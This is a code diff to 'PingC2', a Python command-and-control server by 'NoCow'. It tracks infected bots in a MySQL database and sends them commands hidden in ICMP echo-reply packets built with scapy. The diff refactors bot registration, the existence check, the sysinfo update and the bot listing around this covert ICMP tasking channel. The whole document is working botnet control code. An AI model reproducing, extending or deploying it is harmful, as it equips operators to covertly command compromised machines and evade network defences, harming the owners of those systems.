@@ -7,6 +7,7 @@
 #  a command is sent to the client. Command must start with "run"
 
 from multiprocessing import *
+from datetime import date
 import threading
 import MySQLdb
 import ctypes
@@ -17,8 +18,24 @@ from scapy.all import *
 #def updateCommand():
 #	return command
 
-def addBot(srcIP,name,os):
-	print "[*] Adding bot"
+def displayBots():
+	print "[*] Displaying bots!"
+	db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+        cur = db.cursor()
+	print '{0: <20}'.format('RemoteIP'),'{0: <20}'.format('LocalIP'),'{0: <20}'.format('Name'),'{0: <20}'.format('OS'),'{0: <20}'.format('Checkin date')
+	print "--------------------------------------------------------------------------------------------------"
+	cur.execute("select remoteip,localip,name,os,checkin from bots")
+        for row in cur.fetchall():
+        	print '{0: <20}'.format(row[0]),'{0: <20}'.format(row[1]),'{0: <20}'.format(row[2]),'{0: <20}'.format(row[3]),row[4]
+	db.close()
+
+def updateBotSysinfo(botId,remoteIP,name,os):
+	print "[*] Updating bot info"
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user="pingc2user", # your username
                      passwd="pingc2user", # your password
@@ -27,10 +44,62 @@ def addBot(srcIP,name,os):
         #  you execute all the query you need
         cur = db.cursor()
 	try:
-		cur.execute("""insert into bots (remoteip,name,os) values(%s,%s,%s)""",(srcIP,name,os))
+		cur.execute("update bots set remoteip=%s,name=%s,os=%s where id=%s",(remoteIP,name,os,botId))
+	except Exception,e:
+		print "[X] " + str(e)
+		return False
+	db.commit()
+	print "[*] Bot info updated"
+	db.close()
+	return True
+
+def doesBotExist(botId):
+	print "[*] Checking bot existence"
+        db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+        cur = db.cursor()
+	query = "select * from bots where id=%i" % botId
+        #print "[D] Query: "+query
+        cur.execute(query)
+        if cur.fetchall():
+                print "[*] Bot ID exists"
+		db.close()
+		return True
+	else:
+		db.close()
+		return False
+
+
+def addBot(srcIP,name,os):
+	print "[*] Adding bot"
+	botId=0
+	try:
+		db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+		cur = db.cursor()
+		cur.execute("select max(id) from bots")
+		row = cur.fetchone()
+		if row[0]:
+			botId=int(row[0]) + 1
+			print "[*] Adding bot number %s!" % botId
+		else:
+			botId=1
+			print "[*} Adding first bot to PingC2!"
+		cur.execute("""insert into bots (remoteip,name,os,checkin) values(%s,%s,%s,%s)""",(srcIP,name,os,date.today()))
                 db.commit()
-        except:
-        	print "[X] Error adding bot to database"	
+        except Exception,e:
+        	print "[X] Error: " + str(e)
+	print "[*] Bot ID(%s) added!" % botId
+	db.close()
+	return botId	
 
 def displayMenu():
 	listener = False
@@ -54,13 +123,6 @@ def handler(signum, frame):
 
 # Command and Control main function
 def c2main(command):
-	db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
-                     db="pingc2") # name of the data base
-        # you must create a Cursor object. It will let
-        #  you execute all the query you need
-        cur = db.cursor()
 	print ""
         print "[*] Command received from C2: %s" % command.value
 	while True:
@@ -77,68 +139,48 @@ def c2main(command):
                        		icmp_id = p['ICMP'].id
                        		print "[*] Request: " + request
 				if 'What shall I do master?' in request:
-					#command=updateCommand()
-					query = "select id from bots where id="+request[24:]
-					cur.execute(query)
-					row = cur.fetchall()
-					print "[D] Row: " + row	
-					if row:
+					botId = int(request[24:])
+					if doesBotExist(botId):
 						print "[*] Bot ID exists, sending command"
-						resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
-						#resp.show2()
-                                		send(resp)
-						print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
-						displayMenu()
-						print "Option: "
-					else:
-						print "[*] Client not registered"
-                        	elif 'Checkin' in request:
+                                                resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
+                                                #resp.show2()
+                                                send(resp)
+                                                print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
+                                                print "Option: "
+                                        else:
+                                        	print "[*] Client not registered"
+                        	# Checkin function
+				elif 'Checkin' in request:
 					# Build checkin database and info to capture
 					print "\n[*] %s checking in" % p['IP'].src
 					checkinInfo = request[8:].split()
-                                        addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
-					query='select max(id) from bots'
-					cur.execute(query)
-					row = cur.fetchall()
-					for i in row:
-						print "[D] row-botid:",i[0]
-						botId=i[0]
+                                        botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
 					sendId = "id="+str(botId)
 					#print "[D] SendId: ",sendId
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(sendId)
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                         #resp.show2()
                                         send(resp)
-                                        #print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
-                                        displayMenu()
+                                        print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
                                         print "Option: "
 				elif 'sysinfo' in request:
 					# Build sysinfo capture system database
                         		#print "[D] Inside sysinfo"
 					sysinfo = request[8:].split()					
-					print "[D] Id: " + sysinfo[0]
+					#print "[D] Id: " + sysinfo[0]
                                 	print "\n[*] Received sysinfo from client: %s" % sysinfo
-					cur.execute("select * from bots where id=%s",sysinfo[0])
-                        		row = cur.fetchall()
-                        		#print "[D] Row: ", row
-					if not row :
-                                		try:
-							cur.execute("""insert into bots (id,remoteip,name,os) values(%s,%s,%s)""",(sysinfo[0],p['IP'].src,sysinfo[1],sysinfo[0]))
-                                        		db.commit()
-							print "[*] Adding machine from IP: ",p['IP'].src
-                                		except: 
-							print "[*] Machine already exists, ignoring"
+					if doesBotExist(int(sysinfo[0])):
+						updateBotSysinfo(int(sysinfo[0]),p['IP'].src,sysinfo[2],sysinfo[1])
+                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[0],p['IP'].src)
 					else:
-						print "[*] Machine already exists, ignoring"
+						print "[*] Machine does not exist, ignoring"
 	
 					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                 	#resp.show2()
                                 	print "\n[*] Response sent: Thanks"
                                 	send(resp)
-					displayMenu()      
                         		print "Option: "
 				else:   
                                         print "[**] Client not recognized"
-					displayMenu()
                 	except:
 				error = "[X] ERROR: " + str(sys.exc_info()[0])
                         	logfile_error.write(error)
@@ -157,13 +199,6 @@ def main(argv):
 	print "	 		Command Center              "
 	print "	 		   by NoCow		    "
 	print "	--------------------------------------------"
-	db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
-                     db="pingc2") # name of the data base
-        # you must create a Cursor object. It will let
-        #  you execute all the query you need
-        cur = db.cursor()
 	manager = Manager()
 	command = manager.Namespace()
 	command.value = 'sysinfo'
@@ -173,7 +208,10 @@ def main(argv):
 	while True:
 		signal.signal(signal.SIGINT, handler)
 		#displayMenu()
-		option = raw_input("Option: ")
+		try:
+			option = raw_input("Option: ")
+		except Exception,e:
+			print "[X] Error: " + str(e)
 		#print "[D] Option chosen: ",option
 		if option == '1':
 			command.value = 'sysinfo'
@@ -200,11 +238,7 @@ def main(argv):
 					print "[X] Error starting C2 listener"
 		elif option == '2':
 			print "[*] Displaying bots!"
-			cur.execute("select remoteip,localip,name,os from bots")
-			print "RemoteIP	LocalIP	Name	OS"
-			print "--------------------------------------"
-			for row in cur.fetchall():
-				print"%s	%s	%s	%s" % (row[0],row[1],row[2],row[3])
+			displayBots()
 		elif option == '3':
                         if process.is_alive():
                         	command.value = raw_input("Enter a command: ")
